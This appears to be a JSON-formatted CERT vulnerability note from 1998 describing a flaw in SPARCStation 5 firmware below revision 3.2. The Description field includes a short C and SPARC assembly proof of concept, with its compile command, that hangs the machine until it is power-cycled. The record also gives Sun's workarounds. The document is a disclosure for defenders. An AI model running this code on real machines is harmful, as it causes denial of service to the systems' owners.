{
  "Impact": "Machine will lock up", 
  "CVSS_SecurityRequirementsIR": "", 
  "CVSS_EnvironmentalVector": "", 
  "Title": "ss5_fqtod", 
  "DateFirstPublished": "", 
  "CVSS_AccessVector": "", 
  "CAM_ScoreCurrentWidelyKnown": 1.929375, 
  "IDNumber": "13634", 
  "SystemsAffectedPreamble": "", 
  "CVSS_SecurityRequirementsCR": "", 
  "CVSS_Authenication": "", 
  "CVSS_BaseScore": "", 
  "CAM_EaseOfExploitation": "10", 
  "IPProtocol": "", 
  "CERTAdvisory": "", 
  "CVSS_CollateralDamagePotential": "", 
  "Revision": "1", 
  "CVEIDs": "", 
  "VRDA_D1_DirectReport": "", 
  "CAM_WidelyKnown": "4", 
  "CAM_Population": "14", 
  "Description": "On a SPARCStation 5 with firmware revision lower than 3.2, the following\ncode sample hard hangs the machine, requiring a power cycle to resurrect:\n\nfquad.c:\n\nint a[4];\nint b[2];\n\nmain()\n{\nextern void fquad();\n\na[0] = 0x7fff0000;\na[1] = 0;\na[2] = 0;\na[3] = 0;\n\nwhile (1)\nfquad(&a, &b);\n}\n\nfquad_asm.s:\n\n.global fquad\n\nfquad:\nldd     [%o0], %f4\nldd     [%o0 + 0x8], %f6\nfxtod   %f4, %f2\nstd     %f2, [%o1]\nretl\nnop\n\ncc -o fquad fquad.c fquad_asm.s", 
  "CVSS_AccessComplexity": "", 
  "CVSS_SecurityRequirementsAR": "", 
  "Resolution": "", 
  "Author": "This document was written by CN=Lawrence R Rogers/O=CERT.", 
  "CAM_Exploitation": "15", 
  "DateLastUpdated": "1998-05-21T11:28:13-04:00", 
  "CVSS_IntegrityImpact": "", 
  "VRDA_D1_Population": "", 
  "CVSS_TemporalVector": "", 
  "CVSS_ReportConfidence": "", 
  "CVSS_ConfidentialityImpact": "", 
  "CVSS_BaseVector": "", 
  "VulnerabilityCount": 1, 
  "CVSS_Exploitability": "", 
  "ThanksAndCredit": "", 
  "US-CERTTechnicalAlert": "", 
  "CAM_ScoreCurrentWidelyKnownExploited": 2.12625, 
  "CVSS_TemporalScore": "", 
  "VRDA_D1_Impact": "", 
  "CVSS_TargetDistribution": "", 
  "CAM_InternetInfrastructure": "14", 
  "CVSS_RemediationLevel": "", 
  "Workarounds": "From Sun Bug ID 1151654: [  dhn@Eng - 12/7/93 ] put a non-fp instruction after every unimplemented FPop The work around field as copied from bug report 1178285 follows: 10/12/94 - kkelly@East The problem is avoided by compiling with gcc rev 2.6.0. The work around field as copied from bug report 1178853 follows: 10/12/94 - kkelly@East This appears to be a duplicate of 1151654. Workaround is to use gcc rev. 2.6.0 which produces code that does not\ncontain unimplemented Floating point instructions.", 
  "ID": "VU#13634", 
  "CVSS_AvailabilityImpact": "", 
  "CAM_ScoreCurrent": 1.299375, 
  "Overview": "", 
  "CAM_Impact": "3", 
  "DatePublic": "", 
  "DateCreated": "1998-05-21T11:28:12-04:00", 
  "References": "", 
  "Keywords": [
    "ss5", 
    "fqtod", 
    "lock"
  ], 
  "CVSS_EnvironmentalScore": "", 
  "CAM_AttackerAccessRequired": "5"
}